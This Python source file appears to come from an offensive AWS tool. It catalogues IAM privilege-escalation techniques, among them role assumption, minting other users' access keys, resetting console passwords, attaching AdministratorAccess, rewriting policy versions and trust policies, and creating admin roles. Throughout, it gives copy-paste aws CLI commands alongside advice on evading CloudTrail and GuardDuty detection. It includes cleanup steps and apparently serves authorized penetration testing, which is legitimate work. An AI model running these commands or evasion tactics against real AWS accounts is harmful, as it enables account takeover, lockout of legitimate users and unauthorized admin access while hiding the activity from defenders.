"""IAM edges: identity/structural traversal plus the canonical IAM privilege
escalation methods (Rhino Security Labs set, cross-checked against
DataDog/pathfinding.cloud and HackTricks Cloud).

Every entry stores the human-readable `aws` CLI command. The automated engine
(strategy.py, phase 3) attaches boto3 callables for the same edges; these
strings remain the source of truth for `awspwn info` / `awspwn edges` and for
copy-paste during a manual engagement.
"""

from ..models import AbuseInfo, AbuseStep, BlastRadius, Platform

ABUSE_DB: dict[str, AbuseInfo] = {}


def _s(desc, cmd, api="", blast=BlastRadius.READ, tool="aws", opsec="") -> AbuseStep:
    return AbuseStep(
        description=desc,
        command=cmd,
        platform=Platform.LINUX,
        tool=tool,
        blast_radius=blast,
        api=api,
        opsec_note=opsec,
    )


# ─── CanAssume ──────────────────────────────────────────────────────────────

ABUSE_DB["CanAssume"] = AbuseInfo(
    edge_kind="CanAssume",
    description=(
        "The source principal is permitted by the target role's trust policy "
        "(and its own identity policy) to call sts:AssumeRole. This is the "
        "primary identity-change edge in AWS - the analogue of taking over an "
        "AD account outright."
    ),
    required_permissions=["sts:AssumeRole"],
    source_kinds=["IAMUser", "IAMRole", "FederatedPrincipal", "SSOPrincipal"],
    target_kinds=["IAMRole"],
    blast_radius=BlastRadius.READ,
    opsec_considerations=(
        "Logged in CloudTrail as AssumeRole with your source ARN in "
        "userIdentity. The RoleSessionName you pick is attacker-controlled and "
        "appears in every downstream event - pick something that blends in "
        "rather than the default. GuardDuty does not alert on assume-role by "
        "itself, but does flag anomalous role usage from new ASNs/geos."
    ),
    linux_steps=[
        _s(
            "Assume the target role and export the returned session credentials",
            "aws sts assume-role {AWS_AUTH} \\\n"
            "  --role-arn '{TARGET_ARN}' \\\n"
            "  --role-session-name '{SESSION_NAME}'",
            api="sts:AssumeRole",
            blast=BlastRadius.READ,
        ),
        _s(
            "Confirm the new identity",
            "aws sts get-caller-identity {AWS_AUTH}",
            api="sts:GetCallerIdentity",
        ),
    ],
    references=[
        "https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html",
    ],
)


# ─── AssumeRoleCrossAccount ─────────────────────────────────────────────────

ABUSE_DB["AssumeRoleCrossAccount"] = AbuseInfo(
    edge_kind="AssumeRoleCrossAccount",
    description=(
        "Same mechanic as CanAssume, but the target role lives in a different "
        "AWS account. Pivots the engagement into new account boundaries - the "
        "cloud analogue of a cross-forest trust hop."
    ),
    required_permissions=["sts:AssumeRole"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMRole"],
    blast_radius=BlastRadius.READ,
    opsec_considerations=(
        "Generates events in BOTH accounts: AssumeRole in the trusting account "
        "and the resulting API calls in the target. If the trust requires an "
        "ExternalId you must supply it; a wrong one is a loud AccessDenied."
    ),
    linux_steps=[
        _s(
            "Assume the cross-account role",
            "aws sts assume-role {AWS_AUTH} \\\n"
            "  --role-arn '{TARGET_ARN}' \\\n"
            "  --role-session-name '{SESSION_NAME}'",
            api="sts:AssumeRole",
        ),
        _s(
            "If the trust policy requires an ExternalId, supply it",
            "aws sts assume-role {AWS_AUTH} \\\n"
            "  --role-arn '{TARGET_ARN}' \\\n"
            "  --role-session-name '{SESSION_NAME}' \\\n"
            "  --external-id '{EXTERNAL_ID}'",
            api="sts:AssumeRole",
        ),
    ],
)


# ─── CreateAccessKey ────────────────────────────────────────────────────────

ABUSE_DB["CreateAccessKey"] = AbuseInfo(
    edge_kind="CreateAccessKey",
    description=(
        "iam:CreateAccessKey on another user mints long-lived programmatic "
        "credentials for that user. You become them, permanently, with no "
        "session expiry. Rhino method #1 and still the highest-yield edge in "
        "most environments."
    ),
    required_permissions=["iam:CreateAccessKey"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMUser"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "CloudTrail CreateAccessKey is a classic detection rule and GuardDuty "
        "flags it under Persistence:IAMUser/*. A user is capped at 2 keys - if "
        "the target already has 2 this fails, and deleting one to make room is "
        "destructive. Always clean up: DeleteAccessKey."
    ),
    linux_steps=[
        _s(
            "Mint an access key for the target user",
            "aws iam create-access-key {AWS_AUTH} --user-name '{TARGET_NAME}'",
            api="iam:CreateAccessKey",
            blast=BlastRadius.MUTATE,
        ),
        _s(
            "Verify the new key resolves to the target",
            "AWS_ACCESS_KEY_ID={NEW_ACCESS_KEY} AWS_SECRET_ACCESS_KEY={NEW_SECRET_KEY} \\\n"
            "  aws sts get-caller-identity",
            api="sts:GetCallerIdentity",
        ),
    ],
)
ABUSE_DB["CreateAccessKey"].linux_steps.append(
    AbuseStep(
        description="Cleanup: delete the access key you created",
        command="aws iam delete-access-key {AWS_AUTH} --user-name '{TARGET_NAME}' --access-key-id '{NEW_ACCESS_KEY}'",
        platform=Platform.LINUX,
        tool="aws",
        blast_radius=BlastRadius.MUTATE,
        api="iam:DeleteAccessKey",
        is_cleanup=True,
    )
)


# ─── CreateLoginProfile ─────────────────────────────────────────────────────

ABUSE_DB["CreateLoginProfile"] = AbuseInfo(
    edge_kind="CreateLoginProfile",
    description=(
        "iam:CreateLoginProfile sets a console password on a user that has "
        "none. Grants interactive console access as that principal - useful "
        "when the target's privileges are easier to exercise through the UI."
    ),
    required_permissions=["iam:CreateLoginProfile"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMUser"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "Fails with EntityAlreadyExists if the user already has a console "
        "password - use UpdateLoginProfile instead, but note that overwrites "
        "the legitimate user's password and WILL be noticed. Console logins "
        "surface in CloudTrail as ConsoleLogin with a distinct source IP."
    ),
    linux_steps=[
        _s(
            "Set a console password on the target user",
            "aws iam create-login-profile {AWS_AUTH} \\\n"
            "  --user-name '{TARGET_NAME}' \\\n"
            "  --password '{NEW_PASSWORD}' \\\n"
            "  --no-password-reset-required",
            api="iam:CreateLoginProfile",
            blast=BlastRadius.MUTATE,
        ),
        _s(
            "Sign in at the account console URL",
            "echo 'https://{ACCOUNT_ID}.signin.aws.amazon.com/console'",
        ),
        AbuseStep(
            description="Cleanup: remove the login profile",
            command="aws iam delete-login-profile {AWS_AUTH} --user-name '{TARGET_NAME}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.MUTATE,
            api="iam:DeleteLoginProfile",
            is_cleanup=True,
        ),
    ],
)


# ─── UpdateLoginProfile ─────────────────────────────────────────────────────

ABUSE_DB["UpdateLoginProfile"] = AbuseInfo(
    edge_kind="UpdateLoginProfile",
    description=(
        "iam:UpdateLoginProfile resets the console password of a user that "
        "already has one. Same outcome as CreateLoginProfile but destructive: "
        "the legitimate owner is locked out."
    ),
    required_permissions=["iam:UpdateLoginProfile"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMUser"],
    blast_radius=BlastRadius.DESTRUCTIVE,
    opsec_considerations=(
        "The real user loses console access immediately and will report it. "
        "Only worth it against service/break-glass accounts nobody logs into. "
        "There is no way to restore the original password - rollback can only "
        "delete the profile, not put it back."
    ),
    linux_steps=[
        _s(
            "Reset the target user's console password",
            "aws iam update-login-profile {AWS_AUTH} \\\n"
            "  --user-name '{TARGET_NAME}' \\\n"
            "  --password '{NEW_PASSWORD}' \\\n"
            "  --no-password-reset-required",
            api="iam:UpdateLoginProfile",
            blast=BlastRadius.DESTRUCTIVE,
        ),
    ],
)


# ─── AttachUserPolicy / AttachGroupPolicy / AttachRolePolicy ────────────────

ABUSE_DB["AttachUserPolicy"] = AbuseInfo(
    edge_kind="AttachUserPolicy",
    description=(
        "iam:AttachUserPolicy lets you attach any managed policy - including "
        "AdministratorAccess - to a user. If the target is yourself, this is "
        "direct self-escalation to admin in a single call."
    ),
    required_permissions=["iam:AttachUserPolicy"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMUser"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "AttachUserPolicy with PolicyArn ending in AdministratorAccess is one "
        "of the most heavily alerted events in AWS. A quieter variant is "
        "attaching a narrowly-scoped custom policy that grants only the one "
        "action you actually need."
    ),
    linux_steps=[
        _s(
            "Attach AdministratorAccess to the target user",
            "aws iam attach-user-policy {AWS_AUTH} \\\n"
            "  --user-name '{TARGET_NAME}' \\\n"
            "  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
            api="iam:AttachUserPolicy",
            blast=BlastRadius.MUTATE,
        ),
        AbuseStep(
            description="Cleanup: detach the policy",
            command="aws iam detach-user-policy {AWS_AUTH} --user-name '{TARGET_NAME}' --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.MUTATE,
            api="iam:DetachUserPolicy",
            is_cleanup=True,
        ),
    ],
)

ABUSE_DB["AttachGroupPolicy"] = AbuseInfo(
    edge_kind="AttachGroupPolicy",
    description=(
        "iam:AttachGroupPolicy attaches a managed policy to a group. Every "
        "member of that group inherits it - including you, if you are a "
        "member. Broader blast radius than the user variant."
    ),
    required_permissions=["iam:AttachGroupPolicy"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMGroup"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "Escalates every member of the group, not just you. On a real "
        "engagement that is collateral privilege you did not ask for and must "
        "report. Prefer AttachUserPolicy when you have the choice."
    ),
    linux_steps=[
        _s(
            "Attach AdministratorAccess to a group you belong to",
            "aws iam attach-group-policy {AWS_AUTH} \\\n"
            "  --group-name '{TARGET_NAME}' \\\n"
            "  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
            api="iam:AttachGroupPolicy",
            blast=BlastRadius.MUTATE,
        ),
        AbuseStep(
            description="Cleanup: detach the policy from the group",
            command="aws iam detach-group-policy {AWS_AUTH} --group-name '{TARGET_NAME}' --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.MUTATE,
            api="iam:DetachGroupPolicy",
            is_cleanup=True,
        ),
    ],
)

ABUSE_DB["AttachRolePolicy"] = AbuseInfo(
    edge_kind="AttachRolePolicy",
    description=(
        "iam:AttachRolePolicy attaches a managed policy to a role. Only useful "
        "if you can also assume that role (or something already does - e.g. an "
        "EC2 instance profile or Lambda execution role you control)."
    ),
    required_permissions=["iam:AttachRolePolicy"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMRole"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "Pairs with CanAssume: escalate the role first, then assume it. If the "
        "role is attached to running compute, the new permissions become live "
        "for that workload too."
    ),
    linux_steps=[
        _s(
            "Attach AdministratorAccess to a role you can assume",
            "aws iam attach-role-policy {AWS_AUTH} \\\n"
            "  --role-name '{ROLE_NAME}' \\\n"
            "  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
            api="iam:AttachRolePolicy",
            blast=BlastRadius.MUTATE,
        ),
        _s(
            "Assume the now-privileged role",
            "aws sts assume-role {AWS_AUTH} --role-arn '{TARGET_ARN}' --role-session-name '{SESSION_NAME}'",
            api="sts:AssumeRole",
        ),
        AbuseStep(
            description="Cleanup: detach the policy from the role",
            command="aws iam detach-role-policy {AWS_AUTH} --role-name '{ROLE_NAME}' --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.MUTATE,
            api="iam:DetachRolePolicy",
            is_cleanup=True,
        ),
    ],
)


# ─── PutUserPolicy / PutGroupPolicy / PutRolePolicy ─────────────────────────

_INLINE_ADMIN_DOC = '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'

ABUSE_DB["PutUserPolicy"] = AbuseInfo(
    edge_kind="PutUserPolicy",
    description=(
        "iam:PutUserPolicy writes an INLINE policy onto a user. Functionally "
        "identical to AttachUserPolicy but quieter: inline policies do not "
        "show up in managed-policy inventories and many detections only watch "
        "for AdministratorAccess being attached."
    ),
    required_permissions=["iam:PutUserPolicy"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMUser"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "Quieter than the Attach* variants, but PutUserPolicy is still a "
        "CloudTrail write event. Note this is an OVERWRITE by policy name - if "
        "a policy with that name already exists its contents are replaced, so "
        "capture the original before writing or pick an unused name."
    ),
    linux_steps=[
        _s(
            "Write an inline admin policy onto the target user",
            "aws iam put-user-policy {AWS_AUTH} \\\n"
            "  --user-name '{TARGET_NAME}' \\\n"
            "  --policy-name '{POLICY_NAME}' \\\n"
            f"  --policy-document '{_INLINE_ADMIN_DOC}'",
            api="iam:PutUserPolicy",
            blast=BlastRadius.MUTATE,
        ),
        AbuseStep(
            description="Cleanup: delete the inline policy",
            command="aws iam delete-user-policy {AWS_AUTH} --user-name '{TARGET_NAME}' --policy-name '{POLICY_NAME}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.MUTATE,
            api="iam:DeleteUserPolicy",
            is_cleanup=True,
        ),
    ],
)

ABUSE_DB["PutGroupPolicy"] = AbuseInfo(
    edge_kind="PutGroupPolicy",
    description=(
        "iam:PutGroupPolicy writes an inline policy onto a group, escalating "
        "every member including you."
    ),
    required_permissions=["iam:PutGroupPolicy"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMGroup"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations="Same collateral-privilege caveat as AttachGroupPolicy.",
    linux_steps=[
        _s(
            "Write an inline admin policy onto a group you belong to",
            "aws iam put-group-policy {AWS_AUTH} \\\n"
            "  --group-name '{TARGET_NAME}' \\\n"
            "  --policy-name '{POLICY_NAME}' \\\n"
            f"  --policy-document '{_INLINE_ADMIN_DOC}'",
            api="iam:PutGroupPolicy",
            blast=BlastRadius.MUTATE,
        ),
        AbuseStep(
            description="Cleanup: delete the inline group policy",
            command="aws iam delete-group-policy {AWS_AUTH} --group-name '{TARGET_NAME}' --policy-name '{POLICY_NAME}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.MUTATE,
            api="iam:DeleteGroupPolicy",
            is_cleanup=True,
        ),
    ],
)

ABUSE_DB["PutRolePolicy"] = AbuseInfo(
    edge_kind="PutRolePolicy",
    description=(
        "iam:PutRolePolicy writes an inline policy onto a role you can reach "
        "(assume directly, or via compute that already runs as it)."
    ),
    required_permissions=["iam:PutRolePolicy"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMRole"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "Only pays off combined with a way to act as the role. Chain with "
        "CanAssume, or with a Lambda/EC2 that already uses it."
    ),
    linux_steps=[
        _s(
            "Write an inline admin policy onto the role",
            "aws iam put-role-policy {AWS_AUTH} \\\n"
            "  --role-name '{ROLE_NAME}' \\\n"
            "  --policy-name '{POLICY_NAME}' \\\n"
            f"  --policy-document '{_INLINE_ADMIN_DOC}'",
            api="iam:PutRolePolicy",
            blast=BlastRadius.MUTATE,
        ),
        _s(
            "Assume the now-privileged role",
            "aws sts assume-role {AWS_AUTH} --role-arn '{TARGET_ARN}' --role-session-name '{SESSION_NAME}'",
            api="sts:AssumeRole",
        ),
        AbuseStep(
            description="Cleanup: delete the inline role policy",
            command="aws iam delete-role-policy {AWS_AUTH} --role-name '{ROLE_NAME}' --policy-name '{POLICY_NAME}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.MUTATE,
            api="iam:DeleteRolePolicy",
            is_cleanup=True,
        ),
    ],
)


# ─── CreatePolicyVersion / SetDefaultPolicyVersion ──────────────────────────

ABUSE_DB["CreatePolicyVersion"] = AbuseInfo(
    edge_kind="CreatePolicyVersion",
    description=(
        "iam:CreatePolicyVersion with --set-as-default rewrites the contents of "
        "an existing customer-managed policy. Everything that policy is "
        "attached to instantly gains whatever you put in it - no new "
        "attachment event is generated."
    ),
    required_permissions=["iam:CreatePolicyVersion"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMPolicy"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "Sneakier than Attach* because no principal-to-policy binding changes; "
        "only the policy body does. A policy holds at most 5 versions - if it "
        "is full the call fails and pruning one is destructive. The original "
        "version is retained (unless pruned), so rollback is just "
        "SetDefaultPolicyVersion back to the previous version id."
    ),
    linux_steps=[
        _s(
            "Record the current default version so you can roll back",
            "aws iam get-policy {AWS_AUTH} --policy-arn '{TARGET_ARN}' \\\n"
            "  --query 'Policy.DefaultVersionId' --output text",
            api="iam:GetPolicy",
        ),
        _s(
            "Overwrite the policy with an admin grant and make it default",
            "aws iam create-policy-version {AWS_AUTH} \\\n"
            "  --policy-arn '{TARGET_ARN}' \\\n"
            f"  --policy-document '{_INLINE_ADMIN_DOC}' \\\n"
            "  --set-as-default",
            api="iam:CreatePolicyVersion",
            blast=BlastRadius.MUTATE,
        ),
        AbuseStep(
            description="Cleanup: restore the previous default version, then delete yours",
            command=(
                "aws iam set-default-policy-version {AWS_AUTH} --policy-arn '{TARGET_ARN}' --version-id '{ORIGINAL_VERSION_ID}'\n"
                "aws iam delete-policy-version {AWS_AUTH} --policy-arn '{TARGET_ARN}' --version-id '{NEW_VERSION_ID}'"
            ),
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.MUTATE,
            api="iam:SetDefaultPolicyVersion",
            is_cleanup=True,
        ),
    ],
)

ABUSE_DB["SetDefaultPolicyVersion"] = AbuseInfo(
    edge_kind="SetDefaultPolicyVersion",
    description=(
        "iam:SetDefaultPolicyVersion switches a managed policy back to an "
        "older, more permissive version that already exists. No policy "
        "document is written - you are just picking from history."
    ),
    required_permissions=["iam:SetDefaultPolicyVersion"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMPolicy"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "The quietest of the policy-manipulation edges: no new content, no new "
        "attachment. Requires that a permissive old version still exists - "
        "check ListPolicyVersions first. Trivially reversible."
    ),
    linux_steps=[
        _s(
            "List existing versions and inspect them for a permissive one",
            "aws iam list-policy-versions {AWS_AUTH} --policy-arn '{TARGET_ARN}'",
            api="iam:ListPolicyVersions",
        ),
        _s(
            "Inspect a candidate version's document",
            "aws iam get-policy-version {AWS_AUTH} --policy-arn '{TARGET_ARN}' --version-id '{VERSION_ID}'",
            api="iam:GetPolicyVersion",
        ),
        _s(
            "Roll the policy back to the permissive version",
            "aws iam set-default-policy-version {AWS_AUTH} --policy-arn '{TARGET_ARN}' --version-id '{VERSION_ID}'",
            api="iam:SetDefaultPolicyVersion",
            blast=BlastRadius.MUTATE,
        ),
    ],
)


# ─── AddUserToGroup ─────────────────────────────────────────────────────────

ABUSE_DB["AddUserToGroup"] = AbuseInfo(
    edge_kind="AddUserToGroup",
    description=(
        "iam:AddUserToGroup drops you (or another user) into a privileged "
        "group, inheriting all of its policies. The direct analogue of "
        "ADPwn's AddMember edge."
    ),
    required_permissions=["iam:AddUserToGroup"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMGroup"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "Group membership shows up in any IAM inventory and in Access Analyzer "
        "reports. Cleanly reversible with RemoveUserFromGroup - always do so."
    ),
    linux_steps=[
        _s(
            "Add yourself to the privileged group",
            "aws iam add-user-to-group {AWS_AUTH} \\\n"
            "  --group-name '{TARGET_NAME}' \\\n"
            "  --user-name '{PRINCIPAL_NAME}'",
            api="iam:AddUserToGroup",
            blast=BlastRadius.MUTATE,
        ),
        _s(
            "Confirm the group's policies now apply to you",
            "aws iam list-attached-group-policies {AWS_AUTH} --group-name '{TARGET_NAME}'",
            api="iam:ListAttachedGroupPolicies",
        ),
        AbuseStep(
            description="Cleanup: remove yourself from the group",
            command="aws iam remove-user-from-group {AWS_AUTH} --group-name '{TARGET_NAME}' --user-name '{PRINCIPAL_NAME}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.MUTATE,
            api="iam:RemoveUserFromGroup",
            is_cleanup=True,
        ),
    ],
)


# ─── UpdateAssumeRolePolicy ─────────────────────────────────────────────────

ABUSE_DB["UpdateAssumeRolePolicy"] = AbuseInfo(
    edge_kind="UpdateAssumeRolePolicy",
    description=(
        "iam:UpdateAssumeRolePolicy rewrites a role's trust policy so that YOU "
        "are allowed to assume it. Combined with sts:AssumeRole this takes over "
        "any role in the account - the closest AWS gets to WriteDacl."
    ),
    required_permissions=["iam:UpdateAssumeRolePolicy", "sts:AssumeRole"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMRole"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "This is an OVERWRITE - the original trust policy is replaced, not "
        "merged. Capture the original document first or you will break "
        "whatever legitimately assumed the role. Adding an external account "
        "principal here is EXTERNAL_EXPOSURE, not just MUTATE; see "
        "RoleTrustBackdoor. IAM trust changes take a few seconds to propagate: "
        "expect one or two AccessDenied responses before the assume works."
    ),
    linux_steps=[
        _s(
            "Capture the existing trust policy for rollback",
            "aws iam get-role {AWS_AUTH} --role-name '{ROLE_NAME}' \\\n"
            "  --query 'Role.AssumeRolePolicyDocument'",
            api="iam:GetRole",
        ),
        _s(
            "Rewrite the trust policy to allow your principal",
            "aws iam update-assume-role-policy {AWS_AUTH} \\\n"
            "  --role-name '{ROLE_NAME}' \\\n"
            '  --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"{PRINCIPAL_ARN}"},"Action":"sts:AssumeRole"}]}\'',
            api="iam:UpdateAssumeRolePolicy",
            blast=BlastRadius.MUTATE,
        ),
        _s(
            "Assume the role (retry - trust propagation lags a few seconds)",
            "aws sts assume-role {AWS_AUTH} --role-arn '{TARGET_ARN}' --role-session-name '{SESSION_NAME}'",
            api="sts:AssumeRole",
        ),
        AbuseStep(
            description="Cleanup: restore the original trust policy",
            command="aws iam update-assume-role-policy {AWS_AUTH} --role-name '{ROLE_NAME}' --policy-document '{ORIGINAL_TRUST_POLICY}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.MUTATE,
            api="iam:UpdateAssumeRolePolicy",
            is_cleanup=True,
        ),
    ],
)


# ─── CreateRoleAndAssume ────────────────────────────────────────────────────

ABUSE_DB["CreateRoleAndAssume"] = AbuseInfo(
    edge_kind="CreateRoleAndAssume",
    description=(
        "iam:CreateRole + a policy-granting permission lets you build a brand "
        "new admin role that trusts you, then assume it. Does not touch any "
        "existing principal, so it trips fewer 'privileged user modified' "
        "detections - but it does leave a new role behind."
    ),
    required_permissions=[
        "iam:CreateRole",
        "iam:AttachRolePolicy",
        "sts:AssumeRole",
    ],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["AWSAccount"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "Creates a durable artifact. Name it to blend in with the account's "
        "existing conventions, and always delete it during cleanup "
        "(DetachRolePolicy then DeleteRole - DeleteRole fails while policies "
        "are still attached)."
    ),
    linux_steps=[
        _s(
            "Create a role that trusts your current principal",
            "aws iam create-role {AWS_AUTH} \\\n"
            "  --role-name '{NEW_ROLE_NAME}' \\\n"
            '  --assume-role-policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"{PRINCIPAL_ARN}"},"Action":"sts:AssumeRole"}]}\'',
            api="iam:CreateRole",
            blast=BlastRadius.MUTATE,
        ),
        _s(
            "Give it AdministratorAccess",
            "aws iam attach-role-policy {AWS_AUTH} \\\n"
            "  --role-name '{NEW_ROLE_NAME}' \\\n"
            "  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
            api="iam:AttachRolePolicy",
            blast=BlastRadius.MUTATE,
        ),
        _s(
            "Assume it",
            "aws sts assume-role {AWS_AUTH} \\\n"
            "  --role-arn 'arn:aws:iam::{ACCOUNT_ID}:role/{NEW_ROLE_NAME}' \\\n"
            "  --role-session-name '{SESSION_NAME}'",
            api="sts:AssumeRole",
        ),
        AbuseStep(
            description="Cleanup: detach policies then delete the role",
            command=(
                "aws iam detach-role-policy {AWS_AUTH} --role-name '{NEW_ROLE_NAME}' --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n"
                "aws iam delete-role {AWS_AUTH} --role-name '{NEW_ROLE_NAME}'"
            ),
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.MUTATE,
            api="iam:DeleteRole",
            is_cleanup=True,
        ),
    ],
)


# ─── PassRole (meta) ────────────────────────────────────────────────────────

ABUSE_DB["PassRole"] = AbuseInfo(
    edge_kind="PassRole",
    description=(
        "iam:PassRole is never exploitable on its own - it is the permission "
        "that lets you HAND a role to an AWS service. Its value is entirely in "
        "what you pair it with: ec2:RunInstances, lambda:CreateFunction, "
        "ecs:RunTask, glue:CreateDevEndpoint, cloudformation:CreateStack, "
        "sagemaker:CreateNotebookInstance, codebuild:CreateProject. See the "
        "compute edges for each concrete chain."
    ),
    required_permissions=["iam:PassRole"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMRole"],
    is_abusable=False,
    blast_radius=BlastRadius.READ,
    opsec_considerations=(
        "Check WHICH roles you may pass - the policy Resource field is usually "
        "scoped. `awspwn analyze` reports the passable set per principal."
    ),
    linux_steps=[
        _s(
            "Enumerate which roles your identity policy lets you pass",
            "aws iam simulate-principal-policy {AWS_AUTH} \\\n"
            "  --policy-source-arn '{PRINCIPAL_ARN}' \\\n"
            "  --action-names iam:PassRole \\\n"
            "  --resource-arns '{TARGET_ARN}'",
            api="iam:SimulatePrincipalPolicy",
        ),
    ],
)


# ─── MemberOf (structural but traversable) ──────────────────────────────────

ABUSE_DB["MemberOf"] = AbuseInfo(
    edge_kind="MemberOf",
    description=(
        "The user belongs to this IAM group and inherits every policy attached "
        "to it. Traversable but not independently abusable - the exploitation "
        "lives in whatever the group can do."
    ),
    source_kinds=["IAMUser"],
    target_kinds=["IAMGroup"],
    is_abusable=False,
    blast_radius=BlastRadius.READ,
    linux_steps=[
        _s(
            "List the group's policies to see what membership grants",
            "aws iam list-attached-group-policies {AWS_AUTH} --group-name '{TARGET_NAME}'",
            api="iam:ListAttachedGroupPolicies",
        ),
    ],
)
